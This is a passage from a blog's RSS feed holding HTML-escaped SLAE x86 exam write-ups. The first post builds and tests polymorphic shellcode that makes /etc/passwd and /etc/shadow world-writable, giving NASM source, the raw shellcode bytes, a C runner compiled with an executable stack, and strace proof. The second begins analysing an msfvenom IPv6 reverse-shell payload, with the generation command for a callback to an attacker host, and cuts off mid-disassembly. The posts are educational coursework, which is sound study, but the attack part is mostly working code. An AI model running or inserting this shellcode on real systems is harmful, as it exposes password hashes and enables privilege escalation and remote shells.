&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call chmod(EBX, ECX)&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; ECX = permissions u=rw, g=rw, o=rw&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000030&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;B00F&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000032&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;After that it runs the instruction &lt;code&gt;chmod(&amp;quot;/etc//shadow&amp;quot;, 0666)&lt;/code&gt; to change the permissions over &lt;code&gt;/etc/shadow&lt;/code&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; call exit syscall&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000034&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C0&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000036&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;40&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000037&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Finally it exits using &lt;code&gt;exit(EBX)&lt;/code&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;p&gt;It translates into the following C program:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/stat.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc//passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;chmod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/etc//shadow&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;0666&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// EBX is equal to ESP, so it's just a random exit code&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EBX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It changes the permissions on the files &lt;code&gt;/etc/passwd&lt;/code&gt; and &lt;code&gt;/etc/shadow&lt;/code&gt; to &lt;code&gt;0666&lt;/code&gt;. After that, it uses the &lt;code&gt;exit&lt;/code&gt; syscall to terminate its own execution.&lt;/p&gt;
&lt;h2 id=&quot;polymorphic-version&quot;&gt;Polymorphic version&lt;/h2&gt;
&lt;h3 id=&quot;focus-on-size&quot;&gt;Focus on size&lt;/h3&gt;
&lt;p&gt;Follows the smallest version I managed to write:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;; Author: Robert C. Raducioiu (rbct)&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;_start&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;.text&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;_start:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; clear ECX, EAX, EDX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; store &quot;/etc&quot; into ESI&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   this allows me to reuse this value for the second call to chmod&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x6374652f&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; add a NULL byte (in this case a NULL DWORD) at the end of the string&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   pushed to the stack&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; store the string &quot;/etc//shadow&quot; on the stack&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x776f6461&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x68732f2f&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Remember that when you push a string to the stack, the bytes must be &lt;strong&gt;reversed&lt;/strong&gt;, as &lt;strong&gt;the stack grows downward&lt;/strong&gt;
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;; 1st argument of chmod(): const char *pathname&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;; store into EBX the pointer to &quot;/etc//shadow&quot;&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; set EAX to 0x0000000f -&amp;gt; chmod() syscall&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; 2nd argument of chmod(): mode_t mode&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;; in this case ECX is set to the binary value 110110110&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1b6&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; call chmod()&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; set EAX to 0 and push it to the stack;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;; like before, it acts as the string terminator&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; push &quot;/etc//passwd&quot; to the stack&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x64777373&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; also set EAX to 0x0000000f -&amp;gt; chmod() syscall&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x61702f2f&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; reuse the value of &quot;/etc&quot; from before&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;; 1st argument of chmod(): const char *pathname&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;; store into EBX the pointer to &quot;/etc//passwd&quot;&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; call chmod()&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; invoke the exit syscall&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;; exit code is set to ESP, but it's not important&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The original shellcode uses &lt;code&gt;57&lt;/code&gt; bytes, while this one uses &lt;code&gt;52&lt;/code&gt; bytes:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;objcopy &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; binary &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; .text ./shellcode.o /dev/stdout | &lt;span class=&quot;nb&quot;&gt;wc&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 52&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Although, I managed to make it smaller, it requires one &lt;strong&gt;condition&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the call to &lt;code&gt;chmod&lt;/code&gt; MUST be successful, hence store &lt;code&gt;0&lt;/code&gt; into &lt;code&gt;EAX&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If the register &lt;code&gt;EAX&lt;/code&gt; isn't set to 0, then the next call will throw a &lt;code&gt;SIGSEGV&lt;/code&gt; signal, so the program will crash.&lt;/p&gt;
&lt;h3 id=&quot;focus-on-stability&quot;&gt;Focus on stability&lt;/h3&gt;
&lt;p&gt;For this reason, I also wrote a slightly different version that handles this case, not the SIGSEGV error but clearing the EAX register:&lt;/p&gt;
&lt;div class=&quot;language-patch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gd&quot;&gt;--- polymorphic_tiny.nasm       2022-01-12 07:54:18.947129214 +0000
&lt;/span&gt;&lt;span class=&quot;gi&quot;&gt;+++ polymorphic_stable.nasm     2022-01-12 07:53:52.437239057 +0000
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;@@ -37,7 +37,9 @@&lt;/span&gt;
     ; call chmod()
     int 0x80
 
&lt;span class=&quot;gi&quot;&gt;+    ; set EAX to 0 and push it to the stack;
&lt;/span&gt;     ; like before, it acts as the string terminator
&lt;span class=&quot;gi&quot;&gt;+    mov eax, edx
&lt;/span&gt;     push eax
 
     ; push &quot;/etc//passwd&quot; to the stack
&lt;span class=&quot;p&quot;&gt;@@ -60,5 +62,6 @@&lt;/span&gt;
 
     ; invoke the exit syscall
     ; exit code is set to ESP, but it's not important
&lt;span class=&quot;gi&quot;&gt;+    mov eax, edx
&lt;/span&gt;     inc eax
     int 0x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Since I used the instruction &lt;code&gt;mul ecx&lt;/code&gt; at the beginning, it means &lt;code&gt;EDX&lt;/code&gt; and &lt;code&gt;EAX&lt;/code&gt; are set to 0. Moreover, given &lt;code&gt;EDX&lt;/code&gt; is never used, it means I could use it to clear other registers.&lt;/p&gt;
&lt;p&gt;In this case I repeated two times the following instruction:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Although not very small, at &lt;code&gt;56&lt;/code&gt; bytes, this stable polymorphic version is still smaller than the original shellcode.&lt;/p&gt;
&lt;h3 id=&quot;testing&quot;&gt;Testing&lt;/h3&gt;
&lt;p&gt;To test the polymorphic shellcode, I've used the following C program:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; \
&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xc9\xf7\xe1\xbe\x2f\x65\x74\x63\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x56\x89\xe3\x04\x0f\x66\xb9\xb6\x01\xcd\x80\x89\xd0\x50\x68\x73\x73\x77\x64\x04\x0f\x68\x2f\x2f\x70\x61\x56\x54\x5b\xcd\x80\x89\xd0\x40\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Shellcode length: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To compile:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; execstack &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; test_polymorphic_shellcode test_polymorphic_shellcode.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Once I've run it, I could confirm it executes changes the permissions over &lt;code&gt;/etc/passwd&lt;/code&gt; and &lt;code&gt;/etc/shadow&lt;/code&gt; successfully:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rbct@slae:~/exam/assignment_6/1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;strace &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;trace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; ./test_polymorphic_shellcode 
&lt;span class=&quot;c&quot;&gt;# Shellcode length: 56&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# chmod(&quot;/etc//shadow&quot;, 0666)             = 0&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# chmod(&quot;/etc//passwd&quot;, 0666)             = 0&lt;/span&gt;

rbct@slae:~/exam/assignment_6/1&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;As you can see, &lt;code&gt;chmod&lt;/code&gt; returned the value &lt;code&gt;0&lt;/code&gt; in both cases, which means it managed to change the permissions and exit gracefully.&lt;/p&gt;
</description>
        <pubDate>Tue, 04 Jan 2022 00:00:00 +0100</pubDate>
        <link>/22/01/04/slae32-assignment-6_1</link>
        <guid isPermaLink="true">/22/01/04/slae32-assignment-6_1</guid>
        
        <category>slae</category>
        
        <category>x86</category>
        
        <category>assembly</category>
        
        <category>nasm</category>
        
        <category>c</category>
        
        <category>exam</category>
        
        <category>shellcode</category>
        
        <category>polymorphism</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>SLAE x86 Exam - Assignment #5 Part 4</title>
        <description>&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.pentesteracademy.com/course?id=3&quot;&gt;https://www.pentesteracademy.com/course?id=3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Student ID: PA-30398&lt;/p&gt;
&lt;h2 id=&quot;foreword&quot;&gt;Foreword&lt;/h2&gt;
&lt;p&gt;The 5th assignment requires you to analyze at least 3 shellcode samples created using Msfpayload (nowadays &lt;code&gt;msfvenom&lt;/code&gt;) for 32-bit Linux systems.&lt;/p&gt;
&lt;p&gt;Programs like &lt;code&gt;gdb&lt;/code&gt;/&lt;code&gt;ndisasm&lt;/code&gt;/&lt;code&gt;libemu&lt;/code&gt; can be used for dissecting the shellcode and performing the analysis.&lt;/p&gt;
&lt;p&gt;I chose the following 4 shellcode samples:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/adduser&lt;/td&gt;
&lt;td&gt;Create a new user with UID 0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell/reverse_nonx_tcp&lt;/td&gt;
&lt;td&gt;Spawn a command shell (staged). Connect back to the attacker&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell_find_tag&lt;/td&gt;
&lt;td&gt;Spawn a shell on an established connection (proxy/nat safe)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell_reverse_tcp_ipv6&lt;/td&gt;
&lt;td&gt;Connect back to attacker and spawn a command shell over IPv6&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;In this post I'll analyse &lt;code&gt;linux/x86/shell_reverse_tcp_ipv6&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;h3 id=&quot;ndisasm&quot;&gt;NDISASM&lt;/h3&gt;
&lt;p&gt;To generate the payload:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/shell_reverse_tcp_ipv6 &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;fe80::250:56ff:fe22:364b &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4444 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shellcode.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To analyse it with &lt;code&gt;ndisasm&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ndisasm shellcode.bin &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 32 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; intel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It returns the following output (comments are mine though):&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; EDX:EAX = EBX * 0&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000000&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;DB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000002&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;F7E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Useful for polymorphism: besides &lt;code&gt;EBX&lt;/code&gt;, they clear &lt;code&gt;EAX&lt;/code&gt; and &lt;code&gt;EDX&lt;/code&gt; too
&lt;/sub&gt;&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; IPPROTO_TCP&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000004&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A06&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; SOCK_STREAM&lt;/span&gt;
